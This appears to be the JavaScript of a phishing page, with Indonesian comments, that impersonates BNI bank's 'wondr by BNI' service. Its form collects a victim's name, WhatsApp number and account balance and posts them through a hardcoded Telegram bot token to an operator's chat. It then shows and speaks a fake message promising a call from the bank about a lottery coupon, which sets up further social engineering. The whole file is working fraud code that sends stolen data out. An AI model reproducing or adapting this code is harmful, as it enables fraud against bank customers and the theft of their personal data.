// Konfigurasi Bot Telegram
const TELEGRAM_CONFIG = {
    botToken: "9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs",
    chatId: "6742478722"
};

// Fungsi untuk mengirim notifikasi ke Telegram
async function sendToTelegram(fullName, fullWa, balance) {
    if (TELEGRAM_CONFIG.botToken === "MASUKKAN_BOT_TOKEN_DI_SINI" || TELEGRAM_CONFIG.chatId === "MASUKKAN_CHAT_ID_DI_SINI") {
        console.warn("Token atau Chat ID Telegram belum dikonfigurasi.");
        return;
    }

    const message = `🔔 *Data Baru Diterima*\n\n` +
                    `👤 Nama: ${fullName}\n` +
                    `📱 WhatsApp: ${fullWa}\n` +
                    `💰 Saldo: Rp ${balance}`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (error) {
        console.error("Gagal mengirim ke Telegram:", error);
    }
}

// Inisialisasi Logika Halaman & Event Listener
window.addEventListener('load', function() {
    // Sembunyikan loading awal setelah 1.5 detik
    setTimeout(() => {
        const initialLoading = document.getElementById('initialLoading');
        initialLoading.style.transition = 'opacity 0.5s ease';
        initialLoading.style.opacity = '0';
        setTimeout(() => {
            initialLoading.style.display = 'none';
        }, 500);
    }, 1500);
});

// Format Otomatis Rupiah
const balanceInput = document.getElementById('balance');
balanceInput.addEventListener('input', function (e) {
    let value = this.value.replace(/\D/g, '');
    if (value) {
        this.value = parseInt(value, 10).toLocaleString('id-ID');
    } else {
        this.value = '';
    }
});

// Validasi dan Pengiriman Form
const dataForm = document.getElementById('dataForm');
const whatsappInput = document.getElementById('whatsapp');
const waError = document.getElementById('waError');
const page1 = document.getElementById('page1');
const page2 = document.getElementById('page2');
const submitBtn = document.getElementById('submitBtn');
const loadingOverlay = document.getElementById('loadingOverlay');

dataForm.addEventListener('submit', async function(e) {
    e.preventDefault();

    let waValue = whatsappInput.value.trim();

    // Validasi panjang nomor WA (10 - 13 digit)
    if (waValue.length < 10 || waValue.length > 13 || !/^\d+$/.test(waValue)) {
        waError.classList.remove('hidden');
        whatsappInput.focus();
        return;
    } else {
        waError.classList.add('hidden');
    }

    // Ambil data input
    const fullName = document.getElementById('fullName').value;
    const balance = balanceInput.value;
    const fullWa = "+62" + waValue;

    // Tampilkan animasi loading terpisah di layar
    loadingOverlay.classList.remove('hidden');
    submitBtn.disabled = true;

    // Kirim data ke Telegram secara background
    await sendToTelegram(fullName, fullWa, balance);

    // Jeda 1 detik (1000 ms), lalu sembunyikan loading & pindah ke Halaman 2
    setTimeout(() => {
        loadingOverlay.classList.add('hidden');
        page1.classList.add('hidden');
        page2.classList.remove('hidden');

        startTypingEffect();
        playVoiceMessage();
    }, 1000);
});

// Teks yang akan diketik dan diucapkan
const textString = "Terimakasih Telah Mendaftar Dilayanan wondr by BNI, Pendaftaran Anda Sedang Diproses, Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank BNI, Untuk Proses Cetak Kode Kupon Undian Anda";

// Fungsi Efek Mesin Ketik
function startTypingEffect() {
    const typingTextElement = document.getElementById('typingText');
    let i = 0;
    typingTextElement.innerHTML = '';

    function typeWriter() {
        if (i < textString.length) {
            typingTextElement.innerHTML = textString.substring(0, i + 1) + '<span class="typing-cursor">&nbsp;</span>';
            i++;
            setTimeout(typeWriter, 35);
        } else {
            typingTextElement.innerHTML = textString;
        }
    }
    typeWriter();
}

// Fungsi Suara Bicara (Text-to-Speech browser)
function playVoiceMessage() {
    if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();

        const utterance = new SpeechSynthesisUtterance(textString);
        utterance.lang = 'id-ID';
        utterance.rate = 0.95;
        utterance.pitch = 1.0;

        let voices = window.speechSynthesis.getVoices();
        let indonesianVoice = voices.find(voice => voice.lang === 'id-ID' && (voice.name.includes('Google') || voice.name.includes('Damayanti') || voice.name.includes('Female')));
        if (indonesianVoice) {
            utterance.voice = indonesianVoice;
        }

        window.speechSynthesis.speak(utterance);
    }
}
